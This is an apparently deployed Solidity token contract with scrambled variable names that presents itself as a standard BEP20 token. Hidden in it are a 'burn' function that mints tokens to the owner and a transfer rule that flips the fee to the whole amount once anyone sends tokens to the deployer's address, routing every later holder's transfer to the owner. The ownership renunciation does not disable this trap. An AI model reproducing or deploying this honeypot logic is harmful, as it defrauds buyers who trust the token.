/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.0;
contract cZfCPF {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  DdvLHh = 100000000000000000000000;
uint256 public  swvhnR = 1000000000000000000;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  EuHWBj = 10000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  cXYTWQ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  DYeqaC = 100000000000000000000000;
address private  fKjDnj = address(0);
string public  name = "cZfCPF";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  pXTOIl = 100000000000000000;
address public  TWWSPj = address(0);
string public  symbol = "cZfCPF";
address public owner;
address public  iwsMLk = address(0);
address public  uOMyDz = address(0);
uint256 public  gRimIh = 10000000000000000;
uint256 private  ZNCtEj = 10000000000000;
uint256 public constant lzOkui = 9+1;
uint256 public  WBkXQY = 100000000000000000000;
address public  UXzuGr = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  dLvPAs = address(0);
uint256 public  mCHaDm = 10000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
fKjDnj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HqajEr");
require(to != address(0), "HqajEr");
require(amount <= balanceOf[from], "HqajEr");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* lzOkui/ZNCtEj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==fKjDnj){
ZNCtEj = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safefree: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safefree: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safefree: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safefree: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safefree: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}